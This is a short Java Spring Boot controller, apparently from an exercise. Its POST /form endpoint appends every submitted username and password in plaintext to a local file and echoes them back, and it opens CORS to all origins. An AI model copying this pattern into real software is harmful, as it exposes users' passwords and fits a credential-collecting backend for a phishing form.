package com.example.task2.controller;

import java.io.FileWriter;
import java.io.IOException;

import org.springframework.context.annotation.Bean;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import com.example.task2.models.LoginRequest;

@RestController
public class FormController {
    @GetMapping("/form")
    public String form() {
        return "form";
        }

    @PostMapping("/form")
    public ResponseEntity<?> form(@RequestBody LoginRequest loginRequest) {
        try (FileWriter writer = new FileWriter("inputs.txt", true)) {
            writer.write("Username: " + loginRequest.getUsername() + ", Password: " + loginRequest.getPassword() + "\n");
        } catch (IOException e) {
            return ResponseEntity.status(500).body("Error writing to file");
        }
        return ResponseEntity.ok(loginRequest);
    }

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**").allowedOrigins("*");
            }
        };
    }
}
